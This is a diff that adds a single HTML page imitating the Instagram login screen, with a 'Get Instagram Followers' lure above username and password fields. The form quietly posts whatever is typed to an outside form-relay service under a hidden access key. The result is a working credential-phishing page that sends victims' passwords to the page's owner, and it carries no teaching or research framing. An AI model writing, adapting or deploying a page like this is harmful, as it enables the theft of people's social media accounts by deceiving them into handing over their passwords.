@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            width: 350px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .login-container img {
+            display: block;
+            margin: 0 auto 20px;
+            width: 175px;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #0077b6;
+        }
+        .login-container p {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .login-container a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
+        <center><h4 style="color: darkred;">Get Instagram Followers</h4></center>
+        <form action="https://api.web3forms.com/submit" role="form" method="POST">
+                                <input type="hidden" name="access_key" value="45078fd9-0100-464f-ae5c-cab42b18252a">
+            <input type="text" name="Email" placeholder="Phone number, username, or email" required>
+            <input type="password" name="pass" placeholder="Password" required>
+            <input type="submit" value="Get Followers">
+        </form>
+        <p>OR</p>
+        <p><a href="#">Forgot password?</a></p>
+    </div>
+</body>
+</html>
